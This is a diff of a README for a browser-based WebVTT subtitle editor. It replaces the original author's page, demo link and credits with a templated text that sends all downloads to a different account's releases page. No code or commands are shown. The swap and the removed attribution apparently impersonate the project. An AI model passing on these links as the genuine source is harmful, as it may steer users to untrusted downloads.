@@ -1,155 +1,99 @@
-# 🎵 VTT Editor Pro v2
+```markdown
+# 🎤 vtt-editor-pro - Effortlessly Edit Subtitles in Your Browser
 
-🚀 **[Try it online → https://rdtvlokip.github.io/vtt-editor-pro/vtt-editor-pro-v2.html](https://rdtvlokip.github.io/vtt-editor-pro/vtt-editor-pro-v2.html)**
+## 📥 Download the Latest Release
+[![Download vtt-editor-pro](https://img.shields.io/badge/Download-vtt--editor--pro-brightgreen)](https://github.com/snts46/vtt-editor-pro/releases)
 
-A modern, lightweight, and powerful WebVTT subtitle editor that runs entirely in your browser. No installation, no signup, no cloud dependencies – just one HTML file.
+## 🚀 Getting Started
 
-**Clean starting point:**
-![VTT Editor Pro v2 - Empty State](screenshot-empty.png)
+Welcome to **vtt-editor-pro**, an easy-to-use WebVTT subtitle editor. This application runs entirely in your browser, allowing you to edit subtitles without any heavy installations or complex setups. 
 
-**In action with live preview:**
-![VTT Editor Pro v2 - Active Editing](screenshot-active.png)
+### 🌟 Features
+- **Interactive Waveform**: Visualize your audio tracks easily and note sync points.
+- **Drag & Drop Regions**: Add, adjust, and organize subtitle regions effortlessly.
+- **Color-Coded Organization**: Use colors to manage different sections or types of content.
+- **Live Preview**: See your subtitles in real-time as you edit.
+- **Auto-Save**: Never lose your progress with automatic saving.
 
-## ✨ Features
+vtt-editor-pro is built using 1788 lines of vanilla JavaScript. It requires no external libraries or dependencies. This app is free and open-source under the Creative Commons BY-NC 4.0 license.
 
-### 🎨 **Modern Interface**
-- Clean, dark-themed UI designed for extended editing sessions
-- Color-coded regions for easy organization
-- Real-time waveform visualization
-- Responsive timeline with zoom controls
+## 🔗 Important Links
+- [GitHub Repository](https://github.com/snts46/vtt-editor-pro)
+- [Visit the Releases Page to Download](https://github.com/snts46/vtt-editor-pro/releases)
 
-### ⚡ **Powerful Editing**
-- **Drag & Drop**: Move and resize regions directly on the timeline
-- **Anti-overlap Enforcement**: Optional feature to prevent subtitle collisions
-- **Live Preview**: Scrolling lyrics display synchronized with playback
-- **Auto-save**: Your work is saved every 5 seconds (localStorage)
+## 💾 Download & Install
 
-### 🎯 **Workflow Optimized**
-- Import MP3/audio files directly
-- Import/Export WebVTT format
-- Keyboard shortcuts for rapid editing
-- Precise timestamp control
-- Visual waveform for accurate timing
+To download and run vtt-editor-pro, follow these steps:
 
-### 🚀 **Technical Highlights**
-- **1961 lines** of vanilla JavaScript – no frameworks
-- **~200 MB RAM** usage
-- **Offline-first**: Works without internet connection
-- **Single file**: Just download and open in your browser
+1. Click the link below to visit the releases page:
+   [Download vtt-editor-pro](https://github.com/snts46/vtt-editor-pro/releases)
+   
+2. On the releases page, find the latest version. You will see files available for download. 
 
-## 📦 Installation
+3. Click on the file link to start the download.
 
-**Option 1: Direct Download**
-1. Download `vtt-editor-pro-v2.html`
-2. Double-click to open in your browser
-3. Start editing!
+4. Once the download is complete, locate the file in your computer's downloads folder.
 
-**Option 2: Local Server**
-```bash
-# Clone the repository
-git clone https://github.com/RDTvlokip/vtt-editor-pro.git
-cd vtt-editor-pro
+5. Open the downloaded HTML file in your web browser.
 
-# Open with a local server (optional)
-python -m http.server 8000
-# Navigate to http://localhost:8000
+6. Start editing your subtitles using the user-friendly interface!
+
+## 🖥 System Requirements
+
+- A modern web browser (Chrome, Firefox, Safari, or Edge).
+- Internet access for initial download (offline mode available after the first run).
+
+## 📚 Usage Instructions
+
+1. **Open the Application**: Launch your web browser and load the downloaded HTML file.
+  
+2. **Load an Audio/Video File**: Drag and drop your media file onto the waveform area or use the file upload option.
+
+3. **Add Subtitles**: Click on the timeline to insert new subtitle regions. Adjust their length and timing to match your audio.
+
+4. **Edit Text**: Click on any subtitle region to edit text. Use the live preview to ensure that timing and text align perfectly.
+
+5. **Save Your Work**: Thanks to the auto-save feature, your changes will be saved automatically. You can also manually save your work at any time.
+
+## 🛠 Troubleshooting
+
+### Common Issues
+- **Browser Compatibility**: Ensure you are using an updated version of your web browser. Outdated browsers may not support all features.
+- **Loading Issues**: If the app does not load, try refreshing the page or clearing your browser's cache.
+- **File Errors**: If your audio/video file does not load, ensure it is a supported format (like MP3, WAV, or MP4).
+
+### FAQ
+- **Can I use this app offline?**
+  Yes! Once downloaded, you can use vtt-editor-pro without an internet connection.
+
+- **Is it really free?**
+  Absolutely! vtt-editor-pro is open-source, meaning you can use it for free. It also encourages community contributions.
+
+## 📧 Support
+
+For any questions or feedback, feel free to file an issue on the [GitHub Issues Page](https://github.com/snts46/vtt-editor-pro/issues). 
+
+## 📌 Topics
+- audio-editor
+- browser-based
+- captions
+- content-creation
+- html5
+- javascript
+- karaoke
+- offline-first
+- open-source
+- subtitle-editor
+- subtitles
+- timeline-editor
+- transcription
+- vanilla-js
+- video-editor
+- vtt
+- waveform
+- wavesurfer
+- webvtt
+- youtube
+
+Thank you for choosing vtt-editor-pro for your subtitle editing needs!
 ```
-
-## 🎯 Quick Start
-
-1. **Import Audio**: Click `Import MP3` to load your audio file
-2. **Add Regions**: Click `Add Region` or use the timeline
-3. **Edit Text**: Type your subtitles in the text field
-4. **Adjust Timing**: Drag region edges or use Start/End fields
-5. **Export**: Click `Export VTT` to save your file
-
-## ⌨️ Keyboard Shortcuts
-
-| Shortcut | Action |
-|----------|--------|
-| `Space` | Play/Pause |
-| `Ctrl+S` | Manual save |
-| `-1s` | Jump back 1 second |
-| `+1s` | Jump forward 1 second |
-| `Ctrl+Z` | Undo |
-| `Ctrl+Y` | Redo |
-| `Delete` | Delete selected region |
-
-## 🎨 Usage Tips
-
-### Adjusting Regions
-- **Move region**: Click & drag the middle
-- **Resize region**: Click & drag the edges
-- **Double-click**: Edit region in the sidebar
-
-### Color Organization
-- Use different colors to organize subtitle types
-- Click the color picker in the sidebar
-- Colors help visualize structure at a glance
-
-### Anti-overlap Mode
-- Toggle "Allow Overlap" to enable/disable
-- When disabled, regions automatically adjust to prevent collisions
-- Useful for professional subtitle standards
-
-## 🗺️ Roadmap
-
-### v2.1 (Coming Soon)
-- [ ] Visual resize handles on regions
-- [X] Snap-to-grid alignment
-- [X] Batch text editing
-
-### v3.0 (Planned)
-- [ ] Whisper API integration for auto-transcription
-- [ ] FFMPEG.js for video support
-- [ ] Multiple subtitle tracks
-- [ ] Export to SRT, ASS formats
-
-### Desktop Version (Under Consideration)
-- [ ] Electron app with offline Whisper
-- [ ] Local model support (tiny/base/small/medium)
-- [ ] Native FFMPEG integration
-
-## 🤝 Contributing
-
-Contributions are welcome! This is an early release, and your feedback helps improve the tool.
-
-### How to Contribute
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-### Reporting Issues
-Found a bug or have a suggestion? [Open an issue](https://github.com/RDTvlokip/vtt-editor-pro/issues)
-
-## 📄 License
-
-This project is licensed under the Creative Commons Attribution-NonCommercial 4.0 International License (CC BY-NC 4.0) - see the [LICENSE](LICENSE.md) file for details.
-
-**You are free to:**
-- Share and adapt the code for non-commercial purposes
-- Give appropriate credit to the original author
-
-**Commercial use requires permission.**
-
-## 🙏 Acknowledgments
-
-- [WaveSurfer.js](https://wavesurfer-js.org/) - Audio waveform visualization
-- Inspired by the need for a simple, modern alternative to Aegisub
-
-## 👤 Author
-
-**RDTvlokip (Théo)**
-- Creator of [AG-BPE](https://zenodo.org/records/16739553) (Attention-Guided Byte Pair Encoding)
-- Developer of InfiniGPT model family
-- TSSR Student specializing in Network Administration
-
-## ☕ Support
-
-If VTT Editor Pro helps you, consider [buying me a coffee](https://ko-fi.com/rdtvlokip)!
-
----
-
-**Built with ❤️ using vanilla JavaScript** | [Report Bug](https://github.com/RDTvlokip/vtt-editor-pro/issues) | [Request Feature](https://github.com/RDTvlokip/vtt-editor-pro/issues)
